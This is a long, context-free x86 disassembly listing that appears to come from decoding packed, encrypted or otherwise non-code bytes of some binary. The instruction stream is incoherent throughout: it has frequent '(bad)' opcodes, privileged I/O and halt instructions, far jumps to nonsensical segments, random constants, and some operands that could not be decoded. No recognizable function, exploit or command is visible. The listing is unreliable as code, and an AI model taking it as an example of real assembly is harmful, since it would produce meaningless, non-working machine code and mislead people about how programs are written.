  4146f5:	arpl   WORD PTR [ebx+0x19fac7f8],di
  4146fb:	jg     0x4146fc
  4146fd:	dec    edx
  4146fe:	icebp  
  4146ff:	int    0xfd
  414701:	jmp    0xb93ea3d8
  414706:	jecxz  0x4146b0
  414708:	add    al,0x3f
  41470a:	add    eax,0x38b1f6b3
  41470f:	mov    WORD PTR [ebp-0x41],?
  414712:	faddp  st(4),st
  414714:	xchg   DWORD PTR [ebx-0x36c4d4e4],esp
  41471a:	das    
  41471b:	(bad)  
  41471c:	pop    esi
  41471d:	sar    WORD PTR ds:0x6d87bb12,1
  414724:	ins    DWORD PTR es:[edi],dx
  414725:	xchg   esp,eax
  414726:	add    bh,ah
  414728:	sar    DWORD PTR [eax+0x53],cl
  41472b:	push   0x4a
  41472d:	ret    
  41472e:	jmp    FWORD PTR [esi-0x5a10b988]
  414734:	(bad)  
  414735:	mov    ebp,0x49fa6c13
  41473a:	je     0x414723
  41473c:	scas   al,BYTE PTR es:[edi]
  41473d:	fisubr WORD PTR [ecx+0x1a]
  414740:	mov    ebx,0xbeff7333
  414745:	push   ss
  414746:	pop    ebx
  414747:	sub    BYTE PTR [ebx],bl
  414749:	cld    
  41474a:	jne    0x4146f2
  41474c:	pop    esi
  41474d:	pop    es
  41474e:	xor    BYTE PTR [eax],ch
  414750:	js     0x414733
  414752:	mov    cl,BYTE PTR [eax+edi*8-0x77cccb3c]
  414759:	mov    ds:0x15fd01a5,al
  41475e:	mov    eax,0xd914fbc8
  414763:	arpl   WORD PTR [ebp-0xd],si
  414766:	jns    0x414792
  414768:	sub    dh,BYTE PTR [ebp-0x3e]
  41476b:	sub    DWORD PTR [ebp+0x24],0x75
  41476f:	outs   dx,DWORD PTR ds:[esi]
  414770:	sbb    eax,0x29fe1f1b
  414775:	outs   dx,DWORD PTR ds:[esi]
  414776:	mov    dh,BYTE PTR [ebp-0xa]
  414779:	cwde   
  41477a:	aaa    
  41477b:	add    ecx,DWORD PTR [esi+0x3a9fa5cd]
  414781:	repz adc ah,dl
  414784:	ss inc esi
  414786:	pop    edx
  414787:	nop
  414788:	out    dx,al
  414789:	dec    ebx
  41478a:	add    edx,ebp
  41478c:	lock xor BYTE PTR [ebx+0x42b7fe82],dl
  414793:	xchg   esi,eax
  414794:	aas    
  414795:	pop    ds
  414796:	frstor [eax+0x6c1bd307]
  41479c:	cmps   BYTE PTR cs:[si],BYTE PTR es:[di]
  41479f:	mov    eax,0xbee3f953
  4147a4:	and    dl,bl
  4147a6:	pop    edx
  4147a7:	sti    
  4147a8:	xlat   BYTE PTR ds:[ebx]
  4147a9:	call   DWORD PTR [edx-0x560ad412]
  4147af:	sub    ebp,DWORD PTR cs:[edi-0x6c]
  4147b3:	xlat   BYTE PTR ds:[ebx]
  4147b4:	sti    
  4147b5:	jl     0x414742
  4147b7:	cmp    al,0xc1
  4147b9:	xor    BYTE PTR [esi+ebx*1-0x1f],0x96
  4147be:	ins    DWORD PTR es:[edi],dx
  4147bf:	add    edi,edi
  4147c1:	outs   dx,BYTE PTR ds:[esi]
  4147c2:	fs push ss
  4147c4:	cmc    
  4147c5:	fwait
  4147c6:	fwait
  4147c7:	dec    ecx
  4147c8:	sbb    edx,DWORD PTR [eax+ecx*1]
  4147cb:	pop    esp
  4147cc:	adc    eax,0x54df676a
  4147d1:	xor    BYTE PTR [esi+esi*4],cl
  4147d4:	out    dx,al
  4147d5:	pop    ds
  4147d6:	push   eax
  4147d7:	ret    
  4147d8:	mov    eax,ds:0x9d1eb088
  4147dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147de:	mov    al,dh
  4147e0:	sub    BYTE PTR [ebx+0x171c9e1],bh
  4147e6:	jmp    0x419c4940
  4147eb:	xchg   ecx,eax
  4147ec:	push   esp
  4147ed:	xchg   edx,eax
  4147ee:	loopne 0x4147c9
  4147f0:	inc    ebp
  4147f1:	xchg   esp,eax
  4147f2:	adc    BYTE PTR [edx+0xe],dh
  4147f5:	loop   0x41478c
  4147f7:	mov    fs,WORD PTR [ebp+0x40]
  4147fa:	imul   edi,DWORD PTR [ebp-0x61474b76],0x29d1073b
  414804:	mov    ebx,0x81ea4ba
  414809:	pop    esp
  41480a:	push   esp
  41480b:	cmc    
  41480c:	or     DWORD PTR [ecx-0x51524943],0x5e
  414813:	mov    DWORD PTR [esi+0x3b],eax
  414816:	sbb    al,0xdf
  414818:	loop   0x4147cf
  41481a:	push   eax
  41481b:	pop    ebp
  41481c:	cli    
  41481d:	jne    0x4147d2
  41481f:	add    BYTE PTR [esi+0x11d91f21],ch
  414825:	(bad)  
  414826:	jl     0x414886
  414828:	in     al,dx
  414829:	or     al,0x4c
  41482b:	cmp    eax,0xdc44dece
  414830:	ss call 0x950b:0x2aff41bc
  414838:	call   0xbddc281f
  41483d:	or     DWORD PTR [ecx],esp
  41483f:	push   ds
  414840:	push   ecx
  414841:	lods   al,BYTE PTR ds:[esi]
  414842:	popf   
  414843:	inc    esi
  414844:	pop    cx
  414846:	outs   dx,BYTE PTR ds:[esi]
  414847:	dec    esi
  414848:	mov    eax,0x208e797a
  41484d:	pusha  
  41484e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41484f:	aaa    
  414850:	jp     0x4148a4
  414852:	lock jbe 0x414839
  414855:	hlt    
  414856:	mov    bl,0xfc
  414858:	lahf   
  414859:	lea    ebp,[ebx+ecx*4-0x433b6b6c]
  414860:	mov    ds:0x1d9271e,al
  414865:	jg     0x4148df
  414867:	xchg   ebp,eax
  414868:	mov    eax,ds:0x436e7f84
  41486d:	lock inc ebx
  41486f:	add    ch,BYTE PTR ds:0xad1f12bc
  414875:	fwait
  414876:	(bad)  
  414877:	xlat   BYTE PTR ds:[ebx]
  414878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414879:	ds inc esi
  41487b:	jne    0x414880
  41487d:	jge    0x4148f5
  41487f:	add    ch,BYTE PTR [ebx+0x40170678]
  414885:	fisttp QWORD PTR [ebp+edi*1+0x31c4a0b]
  41488c:	mov    esi,0xba0a76d
  414891:	jecxz  0x414869
  414893:	aad    0x12
  414895:	mov    ah,0xba
  414897:	lock fs rcl dl,cl
  41489b:	mov    ch,0x61
  41489d:	mov    bl,0xaf
  41489f:	shl    DWORD PTR [ebp+0x65],1
  4148a2:	out    0xcb,eax
  4148a4:	xor    al,BYTE PTR ds:0x37eaa575
  4148aa:	shl    DWORD PTR [ebp-0xd],1
  4148ad:	inc    edx
  4148ae:	dec    esp
  4148af:	fdiv   st,st(7)
  4148b1:	lods   eax,DWORD PTR ds:[esi]
  4148b2:	dec    ecx
  4148b3:	mov    ss,WORD PTR [eax]
  4148b5:	popa   
  4148b6:	mov    bh,BYTE PTR ds:0xc149dab5
  4148bc:	sbb    dl,cl
  4148be:	ja     0x41490a
  4148c0:	mov    ecx,0x2cf28fad
  4148c5:	pop    ebp
  4148c6:	stos   DWORD PTR es:[edi],eax
  4148c7:	fs lahf 
  4148c9:	pushf  
  4148ca:	enter  0xc534,0xa8
  4148ce:	inc    ecx
  4148cf:	shr    DWORD PTR [ecx],1
  4148d1:	call   0xcfd6d0e8
  4148d6:	fdiv   st,st(0)
  4148d8:	fbld   TBYTE PTR [esi-0x4c]
  4148db:	repz cmp eax,0x2573ef85
  4148e1:	pop    ebx
  4148e2:	loopne 0x414886
  4148e4:	rcl    DWORD PTR [esi],cl
  4148e6:	xlat   BYTE PTR ds:[ebx]
  4148e7:	or     al,0x45
  4148e9:	xor    ah,BYTE PTR [ecx]
  4148eb:	in     al,0x0
  4148ed:	mov    bl,0xe
  4148ef:	sar    BYTE PTR [edi+eiz*1+0x2e],0x1a
  4148f4:	xchg   esi,eax
  4148f5:	adc    al,0xad
  4148f7:	sbb    BYTE PTR [ebx+edi*1+0x2adab3c2],ch
  4148fe:	jg     0x414915
  414900:	(bad)  
  414901:	iret   
  414902:	mov    BYTE PTR [ebp-0x4],ch
  414905:	push   cs
  414906:	pop    edx
  414907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414908:	in     al,dx
  414909:	sub    eax,DWORD PTR [ecx+eax*8]
  41490c:	xor    DWORD PTR [ecx-0x6f568d71],ebx
  414912:	pop    ebp
  414913:	push   es
  414914:	add    DWORD PTR [edi-0x75],esi
  414917:	xchg   esp,eax
  414918:	int3   
  414919:	adc    ah,BYTE PTR [edx+eiz*4-0x36c656db]
  414920:	int3   
  414921:	pop    es
  414922:	or     ch,dh
  414924:	xchg   ecx,eax
  414925:	cmc    
  414926:	add    al,0x72
  414928:	mov    edx,0x2a571ac5
  41492d:	jp     0x414948
  41492f:	mov    esp,0xbb438d5a
  414934:	pop    ecx
  414935:	push   ss
  414936:	and    eax,0xc0eb25e2
  41493b:	stos   DWORD PTR es:[edi],eax
  41493c:	jmp    0x4a4d54e0
  414941:	mov    edi,0x4e499d9b
  414946:	loop   0x414935
  414948:	adc    esp,edi
  41494a:	repz mov al,0x41
  41494d:	pop    edx
  41494e:	fdiv   DWORD PTR [edi-0x38]
  414951:	popa   
  414952:	stos   BYTE PTR es:[edi],al
  414953:	jno    0x4148d6
  414955:	iret   
  414956:	test   esp,eax
  414958:	bound  esp,QWORD PTR [esi-0x44929c04]
  41495e:	xor    al,0x39
  414960:	sbb    eax,0xe6462ada
  414965:	test   eax,0xfe3fdf7c
  41496a:	inc    ebp
  41496b:	in     eax,0xb
  41496d:	out    0x4,al
  41496f:	dec    ebp
  414970:	push   esp
  414971:	mov    bh,0xa
  414973:	test   eax,0x77c8eee1
  414978:	adc    BYTE PTR [esi],cl
  41497a:	in     al,dx
  41497b:	mov    dl,0xfa
  41497d:	fild   WORD PTR [ebx-0x70]
  414980:	ins    DWORD PTR es:[edi],dx
  414981:	dec    esp
  414982:	adc    dh,BYTE PTR [edx-0x6f]
  414985:	mov    bh,0xef
  414987:	shr    DWORD PTR [ebx-0x45],1
  41498a:	inc    esp
  41498b:	jnp    0x414a06
  41498d:	daa    
  41498e:	cmp    BYTE PTR [edi+0x203c6f36],0xa0
  414995:	push   ss
  414996:	and    al,0x49
  414998:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41499a:	jecxz  0x41498d
  41499c:	xor    al,0x10
  41499e:	imul   edx,DWORD PTR [eax-0x13],0x59228a03
  4149a5:	fstp   QWORD PTR [ecx+0x1]
  4149a8:	xor    BYTE PTR [edi-0x4],ah
  4149ab:	adc    al,0xb7
  4149ad:	fwait
  4149ae:	mov    al,0x46
  4149b0:	pop    esi
  4149b1:	push   edx
  4149b2:	pop    ss
  4149b3:	js     0x41499b
  4149b5:	inc    ecx
  4149b6:	add    DWORD PTR [edx-0x39b6a008],ebp
  4149bc:	push   edi
  4149bd:	inc    ebp
  4149be:	push   0x6638d4d8
  4149c3:	cmp    dl,BYTE PTR ds:0xcf97dc16
  4149c9:	xor    al,0x99
  4149cb:	repnz scas eax,DWORD PTR es:[edi]
  4149cd:	mov    dl,0x42
  4149cf:	stos   DWORD PTR es:[edi],eax
  4149d0:	lods   al,BYTE PTR ds:[esi]
  4149d1:	jbe    0x4149ef
  4149d3:	aad    0xac
  4149d5:	mov    ds,WORD PTR [ebx-0x361c3d87]
  4149db:	bnd jmp 0x322139a5
  4149e1:	and    al,0xad
  4149e3:	in     al,0x51
  4149e5:	push   ss
  4149e6:	ret    0x2027
  4149e9:	aaa    
  4149ea:	inc    esi
  4149eb:	(bad)  
  4149ec:	pop    edx
  4149ed:	dec    ebp
  4149ee:	dec    eax
  4149ef:	pushf  
  4149f0:	push   ecx
  4149f1:	lea    ebp,[edx]
  4149f3:	fnstcw WORD PTR [eax-0x6b]
  4149f6:	(bad)  
  4149f7:	jns    0x4149c9
  4149f9:	or     esp,eax
  4149fb:	stos   DWORD PTR es:[edi],eax
  4149fc:	lods   eax,DWORD PTR ds:[esi]
  4149fd:	rcr    DWORD PTR [edi],0x97
  414a00:	das    
  414a01:	stos   DWORD PTR es:[edi],eax
  414a02:	fidivr DWORD PTR [eax-0x32e3cab1]
  414a08:	clc    
  414a09:	cdq    
  414a0a:	or     esp,DWORD PTR [ecx-0x5db3a8d]
  414a10:	imul   edi,ebx,0xa1c280a5
  414a16:	scas   eax,DWORD PTR es:[edi]
  414a17:	test   DWORD PTR [edi+0x6a],esp
  414a1a:	xor    DWORD PTR [edx],ecx
  414a1c:	or     eax,ebp
  414a1e:	dec    esp
  414a1f:	retf   
  414a20:	js     0x414a2d
  414a22:	into   
  414a23:	data16 (bad) 
  414a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a27:	adc    al,BYTE PTR ds:[ebp-0x54b92a57]
  414a2e:	mov    bl,0x60
  414a30:	mov    BYTE PTR [ebx+ebx*8],ch
  414a33:	push   esp
  414a34:	stos   DWORD PTR es:[edi],eax
  414a35:	fstp   TBYTE PTR [edx-0x20]
  414a38:	retf   
  414a39:	mov    dh,0xc3
  414a3b:	mov    DWORD PTR [edx+0x362a526c],ebp
  414a41:	(bad)  
  414a42:	and    dh,cl
  414a44:	add    eax,0x6318a637
  414a49:	std    
  414a4a:	xor    al,0x64
  414a4c:	mov    ebp,0x366f944f
  414a51:	xor    al,0xff
  414a53:	scas   eax,DWORD PTR es:[edi]
  414a54:	and    DWORD PTR [eax+0x6f],ecx
  414a57:	in     al,dx
  414a58:	lods   eax,DWORD PTR ds:[esi]
  414a59:	out    0x6b,eax
  414a5b:	je     0x414a4c
  414a5d:	lods   eax,DWORD PTR ds:[esi]
  414a5e:	xchg   ebx,eax
  414a5f:	sbb    DWORD PTR [eax-0x49],ebx
  414a62:	into   
  414a63:	mov    WORD PTR [edx+0x56],fs
  414a66:	fadd   QWORD PTR [eax-0x396ca332]
  414a6c:	dec    edx
  414a6d:	mov    ecx,0x8adac33e
  414a72:	and    ebp,DWORD PTR [esi+0x20]
  414a75:	mov    ah,0xc9
  414a77:	lahf   
  414a78:	jne    0x414a2f
  414a7a:	test   al,0x9
  414a7c:	add    al,0xb1
  414a7e:	jg     0x414a3d
  414a80:	sbb    DWORD PTR [ebx+0x13560347],eax
  414a86:	add    esi,0xde3db09
  414a8c:	add    DWORD PTR [edi+0x5e],0x3d
  414a90:	sub    al,0x7e
  414a92:	mov    al,ds:0xa2dd6993
  414a97:	es or  eax,0xc9b4d298
  414a9d:	in     al,0x8c
  414a9f:	xchg   ecx,eax
  414aa0:	xchg   al,ah
  414aa2:	sub    eax,0xab563bd6
  414aa7:	mov    al,0x56
  414aa9:	cs adc al,0x69
  414aac:	pop    es
  414aad:	mov    bl,0xcd
  414aaf:	push   ss
  414ab0:	call   0xf2ee:0x3d6f5983
  414ab7:	jne    0x414aec
  414ab9:	in     eax,dx
  414aba:	mov    eax,ds:0x75dc4a24
  414abf:	imul   eax,DWORD PTR [eax],0xffffffd1
  414ac2:	pop    ebx
  414ac3:	mov    dl,0x43
  414ac5:	pusha  
  414ac6:	repnz cwde 
  414ac8:	jg     0x414a96
  414aca:	xor    esp,DWORD PTR [edx]
  414acc:	push   esi
  414acd:	(bad)  
  414ace:	icebp  
  414acf:	std    
  414ad0:	cmp    ah,BYTE PTR [edx]
  414ad2:	(bad)  
  414ad3:	arpl   WORD PTR [ecx+eax*8+0x45],sp
  414ad7:	sbb    eax,0x7efbb7a6
  414adc:	or     dl,BYTE PTR [esi-0x72]
  414adf:	push   eax
  414ae0:	sti    
  414ae1:	cmp    BYTE PTR [edi+0x64],bh
  414ae4:	xor    BYTE PTR [ebx],al
  414ae6:	(bad)  
  414ae7:	mov    dl,0x82
  414ae9:	bnd jl 0x414a71
  414aec:	sub    DWORD PTR [ebp+0x4b813d2],edi
  414af2:	aaa    
  414af3:	imul   ebp,eax,0xb0e5e44a
  414af9:	shl    esp,0x68
  414afc:	pusha  
  414afd:	loop   0x414aee
  414aff:	mov    esi,0xc3f003a0
  414b04:	inc    ebx
  414b05:	cld    
  414b06:	popa   
  414b07:	sub    bl,ch
  414b09:	out    0x10,eax
  414b0b:	aam    0x47
  414b0d:	dec    ecx
  414b0e:	inc    ebp
  414b0f:	test   ebp,esi
  414b11:	and    DWORD PTR [edx+eax*4+0x27],0xffffff86
  414b16:	mov    dh,0x9c
  414b18:	scas   eax,DWORD PTR es:[edi]
  414b19:	mov    esi,0xebf5d33d
  414b1e:	ds popa 
  414b20:	lds    edi,FWORD PTR [esi-0x58b9739f]
  414b26:	mov    ebp,0x31b02c10
  414b2b:	xor    ch,BYTE PTR [ecx+0x7d957e34]
  414b31:	out    0x4d,eax
  414b33:	rcr    DWORD PTR [eax],1
  414b35:	fistp  QWORD PTR [ebx+ebx*1]
  414b38:	and    eax,0x5c500277
  414b3d:	lahf   
  414b3e:	stos   DWORD PTR es:[edi],eax
  414b3f:	int    0x2a
  414b41:	cmp    DWORD PTR [edx+0x7ab896b9],esi
  414b47:	jg     0x414b8c
  414b49:	leave  
  414b4a:	push   ds
  414b4b:	or     BYTE PTR [eax+ecx*4-0x512413ba],cl
  414b52:	sub    DWORD PTR [edx+ebx*1+0x6b],edx
  414b56:	js     0x414b8d
  414b58:	test   al,0x94
  414b5a:	mov    dl,0x48
  414b5c:	das    
  414b5d:	sbb    eax,0x58a6359d
  414b62:	xchg   edi,eax
  414b63:	ud2    
  414b65:	cmp    BYTE PTR [ecx-0x4dc0626d],0xc2
  414b6c:	jbe    0x414b0d
  414b6e:	leave  
  414b6f:	mov    ch,0x72
  414b71:	add    BYTE PTR [ebp-0x4a],0x90
  414b75:	adc    al,0x4a
  414b77:	xor    ah,BYTE PTR [edx+eiz*4+0x15f1df0f]
  414b7e:	sbb    eax,0xe5f9e6cd
  414b83:	in     eax,dx
  414b84:	aam    0x0
  414b86:	outs   dx,BYTE PTR ds:[esi]
  414b87:	mov    ah,0x88
  414b89:	or     esp,esi
  414b8b:	xlat   BYTE PTR ds:[ebx]
  414b8c:	push   0xffffffef
  414b8e:	pop    eax
  414b8f:	push   ss
  414b90:	xchg   ebx,eax
  414b91:	and    al,bh
  414b93:	or     eax,DWORD PTR [ebp-0x4eec0128]
  414b99:	inc    esi
  414b9a:	lds    edx,FWORD PTR [ebp+esi*4+0x174b9457]
  414ba1:	fdivr  st,st(6)
  414ba3:	mov    ds,WORD PTR ss:[edx]
  414ba6:	add    BYTE PTR [esi+0x13],bh
  414ba9:	vandnps ymm1,ymm2,YMMWORD PTR [esi-0x57]
  414bae:	enter  0x2c1d,0xd3
  414bb2:	test   BYTE PTR [ecx],0xf3
  414bb5:	inc    edi
  414bb6:	adc    edx,ecx
  414bb8:	rcl    edx,0x6
  414bbb:	call   0x6098:0xf512fd3
  414bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bc3:	pop    ds
  414bc4:	xchg   edx,eax
  414bc5:	mov    DWORD PTR [ecx-0x33195af4],edx
  414bcb:	inc    edx
  414bcc:	call   0x28f2:0xdec3424e
  414bd3:	das    
  414bd4:	pop    ebx
  414bd5:	fst    QWORD PTR [ecx-0x4e]
  414bd8:	lahf   
  414bd9:	or     al,0x25
  414bdb:	push   esi
  414bdc:	sub    ah,BYTE PTR [ebp-0x3]
  414bdf:	push   ebx
  414be0:	sub    eax,0xb3801f4
  414be5:	or     al,0x5
  414be7:	ins    DWORD PTR es:[edi],dx
  414be8:	(bad)  
  414be9:	shr    BYTE PTR [ecx+0x31],1
  414bec:	div    al
  414bee:	bound  edx,QWORD PTR [eax+0x7d]
  414bf1:	inc    edx
  414bf2:	jge    0x414b85
  414bf4:	sub    al,0x72
  414bf6:	mov    eax,ds:0x9075a6b7
  414bfb:	xor    eax,0x461572ed
  414c00:	sub    DWORD PTR [ecx],0x28
  414c03:	int    0x74
  414c05:	idiv   BYTE PTR [edx+0x3a83c1a8]
  414c0b:	idiv   cl
  414c0d:	jo     0x414c09
  414c0f:	mov    ebx,0xb1f25b62
  414c14:	ins    DWORD PTR es:[edi],dx
  414c15:	aad    0x28
  414c17:	xor    edi,eax
  414c19:	dec    ebp
  414c1a:	and    al,0x64
  414c1c:	mov    al,ds:0x532668be
  414c21:	test   bl,dl
  414c23:	jno    0x414bab
  414c25:	push   cs
  414c26:	mov    bl,0x8c
  414c28:	loopne 0x414bcb
  414c2a:	or     BYTE PTR [edi-0x2e23a761],dl
  414c30:	mov    dl,0xe3
  414c32:	mov    ch,0xd4
  414c34:	xor    eax,0x377c47e
  414c39:	add    al,0x92
  414c3b:	push   ebp
  414c3c:	imul   eax,DWORD PTR [ebx+0x4ab02739],0x6e
  414c43:	fsub   DWORD PTR [edi-0x4d066867]
  414c49:	popf   
  414c4a:	mov    al,cl
  414c4c:	and    al,0x7b
  414c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c4f:	xor    eax,0xf1059b99
  414c54:	retf   0xd30d
  414c57:	push   ebx
  414c58:	jb     0x414c91
  414c5a:	and    esi,DWORD PTR [esi+0x7b]
  414c5d:	sub    BYTE PTR [edi+0x3e],al
  414c60:	push   edi
  414c61:	cmp    ebp,DWORD PTR [edi]
  414c63:	call   0x7faca47b
  414c68:	jo     0x414bf4
  414c6a:	sbb    DWORD PTR [esi+0x429e7826],ebx
  414c70:	ins    DWORD PTR es:[edi],dx
  414c71:	aaa    
  414c72:	xchg   cl,cl
  414c74:	inc    esi
  414c75:	int3   
  414c76:	dec    ebx
  414c77:	pop    edi
  414c78:	mov    cl,BYTE PTR [eax-0x8]
  414c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c7c:	mov    esi,0x3ab8af67
  414c81:	test   al,0xc6
  414c83:	adc    dl,BYTE PTR [eax+edi*8-0x1bd0b633]
  414c8a:	jns    0x414c83
  414c8c:	mov    ds:0xb84f61d,al
  414c91:	imul   esp,DWORD PTR [edx-0x15c9c6ef],0xb741bd98
  414c9b:	or     ebx,DWORD PTR [ebx-0x59]
  414c9e:	repnz stos DWORD PTR es:[edi],eax
  414ca0:	pop    edx
  414ca1:	jno    0x414d14
  414ca3:	or     ch,dl
  414ca5:	xchg   BYTE PTR [ebx+eiz*8],bh
  414ca8:	jl     0x414d21
  414caa:	inc    edx
  414cab:	fisttp WORD PTR [ecx-0x34]
  414cae:	int3   
  414caf:	add    esi,DWORD PTR [edx+eax*2-0x6e554f84]
  414cb6:	pop    ebp
  414cb7:	xor    ch,BYTE PTR [ecx+0x45ec631d]
  414cbd:	loop   0x414d04
  414cbf:	jb     0x414d13
  414cc1:	sbb    ah,BYTE PTR [esi]
  414cc3:	ins    BYTE PTR es:[edi],dx
  414cc4:	pop    esp
  414cc5:	in     al,0x44
  414cc7:	mov    al,gs:0x407db8e6
  414ccd:	pushf  
  414cce:	add    edi,DWORD PTR [ecx]
  414cd0:	(bad)  
  414cd1:	and    al,0x9a
  414cd3:	cs xchg edi,eax
  414cd5:	inc    esi
  414cd6:	inc    edx
  414cd7:	out    0x5b,al
  414cd9:	mov    eax,ds:0x9ed4de32
  414cde:	lock das 
  414ce0:	fisttp DWORD PTR [esi+0x2779ad6e]
  414ce6:	dec    esp
  414ce7:	add    DWORD PTR [eax+0x1f],ebx
  414cea:	ja     0x414cff
  414cec:	sbb    BYTE PTR ds:0xf80a38bf,al
  414cf2:	fwait
  414cf3:	sbb    DWORD PTR [ebp+0x66],0xfc445f08
  414cfa:	jl     0x414d65
  414cfc:	and    al,0xd9
  414cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cff:	jl     0x414cd2
  414d01:	fild   DWORD PTR [ecx-0x10]
  414d04:	mov    ecx,0x7ae01703
  414d09:	daa    
  414d0a:	mov    al,0xf1
  414d0c:	cmp    cl,BYTE PTR [edi-0x190ebde5]
  414d12:	test   eax,0xe6c6f877
  414d17:	push   0x73364e4b
  414d1c:	and    ebp,edi
  414d1e:	inc    esi
  414d1f:	or     dl,BYTE PTR [eax]
  414d21:	lods   eax,DWORD PTR ds:[esi]
  414d22:	xchg   esp,eax
  414d23:	push   eax
  414d24:	mov    eax,0xd74521d4
  414d29:	dec    eax
  414d2a:	adc    ecx,DWORD PTR [edi+ebp*8-0x4a]
  414d2e:	pop    edx
  414d2f:	out    dx,eax
  414d30:	and    BYTE PTR [ebp+0x2b],al
  414d33:	and    BYTE PTR [eax],0xe2
  414d36:	xor    eax,0x146641cd
  414d3b:	pop    eax
  414d3c:	adc    al,0xdf
  414d3e:	enter  0xaa28,0xb7
  414d42:	dec    esp
  414d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d44:	cmp    BYTE PTR [eax-0x4318420],ah
  414d4a:	push   esi
  414d4b:	mov    al,ds:0xdcb4a8ac
  414d50:	neg    ecx
  414d52:	icebp  
  414d53:	and    esp,DWORD PTR [ebx-0x6fae192a]
  414d59:	mov    ebp,ebp
  414d5b:	call   0xa1738590
  414d60:	sub    ebp,DWORD PTR [eax+0xc]
  414d63:	jnp    0x414d0d
  414d65:	add    BYTE PTR [edi],dl
  414d67:	bnd jnp 0x414cee
  414d6a:	add    eax,0x59467ea8
  414d6f:	adc    DWORD PTR [edi-0x42],ebx
  414d72:	add    DWORD PTR [esi-0x49],ecx
  414d75:	scas   al,BYTE PTR es:[edi]
  414d76:	mov    WORD PTR [ebx+eax*1],?
  414d79:	mov    ds:0x68d2e326,al
  414d7e:	push   esp
  414d7f:	xchg   BYTE PTR [ebx],ah
  414d81:	or     ch,BYTE PTR [edi+0x4a]
  414d84:	push   ss
  414d85:	xchg   ebx,eax
  414d86:	push   ss
  414d87:	stos   BYTE PTR es:[edi],al
  414d88:	into   
  414d89:	mov    ecx,0x77537d7e
  414d8e:	mov    al,0x34
  414d90:	sbb    edx,esp
  414d92:	addr16 popf 
  414d94:	push   edx
  414d95:	fst    QWORD PTR [ebp+0x194e4bb8]
  414d9b:	push   eax
  414d9c:	push   ecx
  414d9d:	dec    ebx
  414d9e:	imul   edi,ebx,0xffffffb2
  414da1:	and    al,dl
  414da3:	into   
  414da4:	arpl   cx,bx
  414da6:	inc    eax
  414da7:	cmp    eax,0xbc96c679
  414dac:	jmp    0xf220:0xa4717f22
  414db3:	dec    esp
  414db4:	push   esp
  414db5:	(bad)  
  414db7:	push   ebp
  414db8:	inc    ebx
  414db9:	xchg   esi,eax
  414dba:	in     al,0xeb
  414dbc:	stos   DWORD PTR es:[edi],eax
  414dbd:	mov    dl,0x3c
  414dbf:	addr16 ret 
  414dc1:	stos   DWORD PTR es:[edi],eax
  414dc2:	int3   
  414dc3:	inc    edx
  414dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc5:	out    dx,eax
  414dc6:	rcr    BYTE PTR [ebx+0x5b8a7131],0xbe
  414dcd:	and    ebp,ebp
  414dcf:	mov    edx,0xb79c18ab
  414dd4:	icebp  
  414dd5:	dec    esp
  414dd6:	cmp    eax,0xc56ea467
  414ddb:	mov    al,0xa9
  414ddd:	pop    esp
  414dde:	add    edi,ebp
  414de0:	adc    edi,DWORD PTR [edi-0x2b811f04]
  414de6:	mov    al,ds:0xe289aac5
  414deb:	call   0x58f:0x61d2d0b2
  414df2:	xlat   BYTE PTR ds:[ebx]
  414df3:	lahf   
  414df4:	(bad)  
  414df6:	xchg   ebp,eax
  414df7:	fwait
  414df8:	jp     0x414da9
  414dfa:	push   ebx
  414dfb:	and    dl,BYTE PTR [esi-0x5f65cc73]
  414e01:	or     DWORD PTR [esi],0x6a87e7b8
  414e07:	push   edx
  414e08:	jle    0x414e5c
  414e0a:	jno    0x414dad
  414e0c:	inc    ebp
  414e0d:	in     al,dx
  414e0e:	aas    
  414e0f:	push   ebp
  414e10:	pop    ecx
  414e11:	ins    BYTE PTR es:[edi],dx
  414e12:	pop    edi
  414e13:	mov    ah,0xc2
  414e15:	sbb    BYTE PTR [esi-0x29],ch
  414e18:	push   ecx
  414e19:	in     eax,dx
  414e1a:	fist   DWORD PTR [edx]
  414e1c:	gs repnz xor ecx,edx
  414e20:	push   esi
  414e21:	fsub   DWORD PTR [edi]
  414e23:	jmp    0x3c02:0x35326b6f
  414e2a:	add    al,0x22
  414e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e2d:	mul    BYTE PTR [edx+0x61f4de64]
  414e33:	(bad)  
  414e34:	add    ah,cl
  414e36:	add    dh,cl
  414e38:	sbb    BYTE PTR [edx+0x4b],ch
  414e3b:	popf   
  414e3c:	xchg   esi,eax
  414e3d:	mov    esi,0x4e574407
  414e42:	sti    
  414e43:	fwait
  414e44:	or     edx,DWORD PTR ds:0x82a31aa7
  414e4a:	sti    
  414e4b:	xor    eax,0x7dbe072b
  414e50:	xchg   sp,ax
  414e52:	mov    esi,0x62e3fe93
  414e57:	add    BYTE PTR ds:0x5de6b143,bh
  414e5d:	mov    al,ds:0x179ab21
  414e62:	jge    0x414e9d
  414e64:	(bad)  
  414e66:	(bad)  
  414e67:	ror    DWORD PTR [ecx+0x2fde3d43],cl
  414e6d:	sbb    eax,0x611c753d
  414e72:	cmp    eax,0x419262df
  414e77:	cdq    
  414e78:	pop    esp
  414e79:	jmp    0x5c080f47
  414e7e:	and    edi,DWORD PTR [edx+0x1f]
  414e81:	pop    esi
  414e82:	pusha  
  414e83:	jge    0x414e2e
  414e85:	add    ch,dh
  414e87:	fcomp  QWORD PTR [ecx]
  414e89:	jmp    0x191d9ed1
  414e8e:	aas    
  414e8f:	sbb    bh,BYTE PTR [edx+0x162d4971]
  414e95:	pop    ecx
  414e96:	test   al,0x55
  414e98:	sbb    BYTE PTR [ebx-0x6f982728],ch
  414e9e:	mov    eax,ds:0x47acb655
  414ea3:	adc    BYTE PTR [edi+0x15],cl
  414ea6:	push   0xffffffe1
  414ea8:	add    al,0x91
